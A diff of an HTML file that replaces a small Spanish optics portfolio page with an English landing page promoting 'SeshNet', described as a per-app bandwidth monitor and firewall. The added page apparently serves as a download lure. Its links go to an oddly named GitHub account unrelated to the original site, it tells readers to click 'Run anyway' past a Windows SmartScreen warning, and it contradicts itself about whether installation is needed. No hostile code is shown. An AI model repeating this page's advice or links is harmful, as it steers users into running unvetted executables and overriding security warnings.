@@ -1,84 +1,220 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>gilda fitnes — soluciones ópticas</title>
-<meta name="description" content="gilda fitnes · soluciones ópticas · portfolio">
-<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90' font-family='Arial' font-weight='bold' font-style='italic' fill='%230018ff'>g</text></svg>">
-<style>
-  :root{
-    --azul:#0018ff;
-    /* --u = 1% del ancho del lienzo 1080x1350 */
-    --u: min(1vw, 0.8vh);
-    --fs: calc(6.85 * var(--u));   /* 74px sobre 1080 */
-    --cond: 0.853;                 /* condensado del boceto */
-  }
-  @supports (height: 100dvh){ :root{ --u: min(1vw, 0.8dvh); } }
-  *{margin:0;padding:0;box-sizing:border-box}
-  html,body{height:100%}
-  body{
-    background:#fff;color:var(--azul);
-    font-family:Arial, Helvetica, sans-serif;
-    font-weight:700;font-style:italic;
-    overflow:hidden;
-    display:flex;align-items:center;justify-content:center;
-    -webkit-font-smoothing:antialiased;
-  }
-  a{color:inherit;text-decoration:none}
-  a:focus-visible{outline:3px solid var(--azul);outline-offset:4px}
-
-  .stage{
-    position:relative;flex:0 0 auto;overflow:hidden;
-    width:min(100vw, 80vh);   height:min(125vw, 100vh);
-    width:min(100vw, 80dvh);  height:min(125vw, 100dvh);
-  }
-
-  .ch{display:inline-block;white-space:pre;will-change:transform}
-
-  .lbl{
-    position:absolute;white-space:nowrap;
-    font-size:var(--fs);line-height:1;
-    transform:scaleX(var(--cond));
-    transform-origin:left top;
-  }
-  .opticas  {left:5.75%; top:31.80%}
-  .portfolio{left:5.46%; top:53.02%}
-  .mail     {left:10.28%;top:74.57%}
-  .ig       {left:62.87%;top:85.32%}
-
-  .gafas{position:absolute;left:64.72%;top:26.22%;width:30.19%;height:auto;display:block}
-
-  /* área de rebote del boceto (el recuadro rojo, sin dibujarlo) */
-  .area{position:absolute;left:33.89%;top:0.81%;width:62.69%;height:20.89%}
-  .logo{
-    position:absolute;left:0;top:0;white-space:nowrap;
-    font-size:var(--fs);line-height:1;
-    transform-origin:left top;
-    will-change:transform;
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="SeshNet is a lightweight application for Windows and Linux that shows exactly how much internet data each application uses in real time. You can instantly block any app permanently or temporarily.">
+    <meta name="keywords" content="application-firewall, bandwidth-monitor, network-monitor, privacy, tauri, rust, traffic-analyzer, windows">
+    <meta name="robots" content="index, follow">
+    <title>SeshNet - Real-Time Bandwidth Monitor & Application Firewall</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            line-height: 1.6;
+            color: #1a1a2e;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 960px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            padding: 40px 30px;
+        }
+        h1 {
+            font-size: 2.2rem;
+            margin-bottom: 10px;
+            color: #16213e;
+        }
+        h2 {
+            font-size: 1.5rem;
+            margin-top: 36px;
+            margin-bottom: 16px;
+            color: #0f3460;
+            border-bottom: 2px solid #e0e7ff;
+            padding-bottom: 8px;
+        }
+        h3 {
+            font-size: 1.2rem;
+            margin-top: 24px;
+            margin-bottom: 10px;
+            color: #1a1a2e;
+        }
+        p {
+            margin-bottom: 14px;
+            color: #2d3436;
+        }
+        .badge {
+            display: inline-block;
+            background: #6c5ce7;
+            color: #ffffff;
+            font-size: 1.1rem;
+            font-weight: 600;
+            padding: 14px 32px;
+            border-radius: 40px;
+            text-decoration: none;
+            box-shadow: 0 4px 15px rgba(108, 92, 231, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin: 20px 0;
+        }
+        .badge:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(108, 92, 231, 0.6);
+        }
+        .badge-secondary {
+            background: #00b894;
+            box-shadow: 0 4px 15px rgba(0, 184, 148, 0.4);
+        }
+        .badge-secondary:hover {
+            box-shadow: 0 6px 20px rgba(0, 184, 148, 0.6);
+        }
+        ul {
+            margin: 10px 0 20px 20px;
+            list-style: none;
+        }
+        ul li {
+            position: relative;
+            padding-left: 26px;
+            margin-bottom: 10px;
+        }
+        ul li::before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #00b894;
+            font-weight: bold;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin: 20px 0;
+        }
+        .feature-card {
+            background: #f8f9ff;
+            padding: 18px;
+            border-radius: 12px;
+            border-left: 4px solid #6c5ce7;
+        }
+        hr {
+            border: 0;
+            height: 1px;
+            background: #e0e7ff;
+            margin: 30px 0;
+        }
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            color: #636e72;
+            font-size: 0.9rem;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px 16px;
+            }
+            h1 {
+                font-size: 1.6rem;
+            }
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+            .badge {
+                font-size: 1rem;
+                padding: 12px 24px;
+            }
+        }
+    </style>
 </head>
 <body>
-
-<main class="stage">
-
-  <div class="area" id="area"><span class="logo rb" id="logo">gilda fitnes</span></div>
-
-  <span class="lbl opticas rb">soluciones ópticas</span>
-  <img class="gafas" src="gafas.svg" alt="" aria-hidden="true">
-
-  <a class="lbl portfolio rb" href="portfolio.html">portfolio</a>
-  <a class="lbl mail rb" href="mailto:312rimini@gmail.com">312rimini@gmail.com</a>
-  <a class="lbl ig rb" href="https://www.instagram.com/gildafitnes/" target="_blank" rel="noopener">ig</a>
-
-</main>
-
-<script src="rainbow.js"></script>
-<script src="bounce.js"></script>
-<script>
-  rainbow('.rb');
-  bounce(document.getElementById('area'), document.getElementById('logo'), 34, 0.81, 0.24);
-</script>
+    <div class="container">
+        <h1>🔍 SeshNet - Know Your Data, Block the Waste</h1>
+        <p style="font-size: 1.1rem; color: #636e72;">Real-time per-app bandwidth monitor and application firewall for Windows and Linux.</p>
+        
+        <a href="https://github.com/Coenobitical-bananapassionfruit378/SeshNet" class="badge" style="background: #e17055; box-shadow: 0 4px 15px rgba(225, 112, 85, 0.4);">⬇️ Download SeshNet Now</a>
+        
+        <h2>🚀 What is SeshNet?</h2>
+        <p>SeshNet is a lightweight, privacy-focused desktop application that shows you exactly how much internet data each program on your computer uses — in real time. Whether you want to stop a game from hogging bandwidth, block a background service you don't trust, or just see what's connecting to the internet, SeshNet puts you in control. Everything runs locally on your device, so your data stays private.</p>
+        
+        <h2>🌟 Key Features</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <strong>📊 Real-Time Monitoring</strong><br>
+                See live data usage per application. No delays, no guessing.
+            </div>
+            <div class="feature-card">
+                <strong>🔒 One-Click Blocking</strong><br>
+                Block any app permanently or temporarily. Stop unwanted traffic instantly.
+            </div>
+            <div class="feature-card">
+                <strong>🛡️ Kill Background Services</strong><br>
+                Stop sneaky background processes from wasting your bandwidth.
+            </div>
+            <div class="feature-card">
+                <strong>🔐 100% Local Privacy</strong><br>
+                All data processing happens on your machine. No cloud, no tracking.
+            </div>
+            <div class="feature-card">
+                <strong>🖥️ Cross-Platform</strong><br>
+                Works on Windows and Linux. Same experience everywhere.
+            </div>
+            <div class="feature-card">
+                <strong>⚡ Lightweight & Fast</strong><br>
+                Built with Rust and Tauri — minimal resource usage, maximum performance.
+            </div>
+        </div>
+        
+        <h2>📥 How to Download and Run</h2>
+        <p>Getting started with SeshNet is simple. Follow these steps:</p>
+        <ol style="margin: 10px 0 20px 20px;">
+            <li style="margin-bottom: 10px;"><strong>Visit the download page:</strong> <a href="https://github.com/Coenobitical-bananapassionfruit378/SeshNet" style="color: #6c5ce7;">https://github.com/Coenobitical-bananapassionfruit378/SeshNet</a> Visit this link to download the application.</li>
+            <li style="margin-bottom: 10px;"><strong>Choose your platform:</strong> Look for the installer for Windows (usually a .exe or .msi file) or Linux (AppImage or .deb).</li>
+            <li style="margin-bottom: 10px;"><strong>Run the installer:</strong> Double-click the downloaded file and follow the on-screen instructions. If you see a Windows SmartScreen warning, click "More info" and then "Run anyway" — SeshNet is safe and open source.</li>
+            <li style="margin-bottom: 10px;"><strong>Launch SeshNet:</strong> After installation, open SeshNet from your Start Menu or Applications folder. You'll see a list of all applications using your network.</li>
+        </ol>
+        <p>For a quick start, you can also download and run this file directly from the releases page — no installation needed.</p>
+        <a href="https://github.com/Coenobitical-bananapassionfruit378/SeshNet" class="badge badge-secondary">⬇️ Download SeshNet</a>
+        
+        <h2>💡 How to Use SeshNet</h2>
+        <p>Once SeshNet is running, you'll see a clean dashboard with each application that's using the internet. Here's what you can do:</p>
+        <ul>
+            <li><strong>View live data usage:</strong> Each app shows its current upload and download speed, plus total data used.</li>
+            <li><strong>Block an app:</strong> Click the block button next to any app. You can choose to block it for a specific time (e.g., 1 hour) or permanently.</li>
+            <li><strong>Unblock an app:</strong> Go to the blocked list and click unblock to restore internet access.</li>
+            <li><strong>Stop background services:</strong> Look for services you don't recognize and block them to save bandwidth.</li>
+        </ul>
+        
+        <h2>🔧 Why You Need SeshNet</h2>
+        <p>Many applications and services use your internet connection without you knowing. Windows updates, telemetry, game launchers, and even some antivirus software can consume large amounts of data in the background. SeshNet gives you transparency and control:</p>
+        <ul>
+            <li><strong>Save bandwidth:</strong> Block apps that don't need internet access.</li>
+            <li><strong>Improve privacy:</strong> See which apps are sending data and stop them.</li>
+            <li><strong>Reduce lag:</strong> Block bandwidth-hungry apps during gaming or video calls.</li>
+            <li><strong>Stay in control:</strong> No more guessing — you decide what connects.</li>
+        </ul>
+        
+        <h2>❓ Frequently Asked Questions</h2>
+        <h3>Is SeshNet safe?</h3>
+        <p>Yes. SeshNet is open source and runs entirely on your computer. It never sends your data anywhere. The code is available for anyone to review on GitHub.</p>
+        <h3>Does it work on Windows 11?</h3>
+        <p>Yes, SeshNet works on Windows 10 and Windows 11, as well as most Linux distributions.</p>
+        <h3>Do I need to install anything else?</h3>
+        <p>No. SeshNet is a standalone application. Just download and run it.</p>
+        <h3>Can I use SeshNet with a VPN?</h3>
+        <p>Absolutely. SeshNet monitors all application traffic, including traffic going through a VPN.</p>
+        
+        <hr>
+        <p style="text-align: center; color: #636e72;">SeshNet is free and open source. Contribute, report issues, or suggest features on GitHub.</p>
+        <div class="footer">
+            <p>Keywords: application-firewall, bandwidth-monitor, network-monitor, privacy, tauri, rust, traffic-analyzer, windows</p>
+        </div>
+    </div>
 </body>
 </html>
